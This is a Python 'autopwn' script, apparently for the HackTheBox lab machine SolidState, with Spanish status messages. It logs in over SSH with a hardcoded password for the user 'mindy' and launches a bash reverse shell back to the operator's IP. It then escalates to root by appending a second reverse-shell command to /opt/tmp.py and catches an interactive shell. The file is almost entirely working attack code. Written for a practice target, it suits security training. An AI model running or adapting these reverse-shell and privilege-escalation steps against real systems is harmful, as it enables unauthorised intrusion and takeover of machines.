import sys
import requests
import threading
import paramiko

print("""
 _             _             ___  _____ 
| |           (_)           |__ \| ____|
| | _____ _ __ _  __ _  __ _   ) | |__  
| |/ / _ \ '__| |/ _` |/ _` | / /|___ \ 
|   <  __/ |  | | (_| | (_| |/ /_ ___) |
|_|\_\___|_|  | |\__,_|\__, |____|____/ 
             _/ |       __/ |           
            |__/       |___/       
""")
print('KERJAG25 - SOLIDSTATE HACKTHEBOX AUTOPWN\n')

port = 4444
portb = 4445
ip = input('Introduce tu IP (tun0): ')

from pwn import *

def def_handler(sig, frame):
    print('[-]Exit')
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def ping(host):
    response = os.system(f'ping -c 1 {host} >/dev/null 2>&1')
    if response == 0:
        return True

    else:
        return False

if ping('10.10.10.51') == False:
    print('[-]Conexión con la máquina fallida')
    time.sleep(0.5)
    print('[-]La máquina está activa?')
    time.sleep(0.5)
    print('[-]Intenta ejecutar el script de nuevo')
    sys.exit(1)


if ping('10.10.10.51') == True:
    print('[+]Conexión Exitosa')
    time.sleep(0.5)
    r = requests.get('http://10.10.10.51')    
    if r.status_code == 200:
        print(f'[+]HTTP/{r.status_code} OK')
        time.sleep(0.5)
        
        def mindy():
            p = paramiko.SSHClient()
            p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            p.connect("10.10.10.51", port=22, username="mindy", password="P@55W0rd1!2@")
            stdin, stdout, stderr = p.exec_command(f'''bash -c "bash -i >& /dev/tcp/{ip}/4444 0>&1"''')
            opt = stdout.readlines()
            opt = "".join(opt)
            print(opt)

        try:
            threading.Thread(target=mindy).start()

        except Exception as e:
            print(f'[-]{e}')       

        shellc = listen(port, timeout=5).wait_for_connection()
        
        if shellc.sock is None:
            print("[-]Conexión fallida")
            sys.exit(1)
        
        else:
            print('[+]Logueado como mindy')
            time.sleep(0.5)
            print('[!]ESTO VA A TARDAR 3 MINUTOS, NO TE DESESPERES')
            
            print('[+]Logueado como mindy')    
            shellc.sendline(f"""echo "os.system('bash -c \\"bash -i >& /dev/tcp/{ip}/4445 0>&1\\"')" >> /opt/tmp.py""")

            shelld = listen(portb, timeout=190).wait_for_connection()

            if shelld.sock is None:
                print('[-]Escalada fallida')
                sys.exit(1)

            else:
                print('[+]Escalada exitosa')
                time.sleep(0.5)
                print('"CTRL + C" PARA SALIR')
            shelld.interactive()

    else:
        print(f'Algo salió mal HTTP/{r.status_code}')
        sys.exit(1)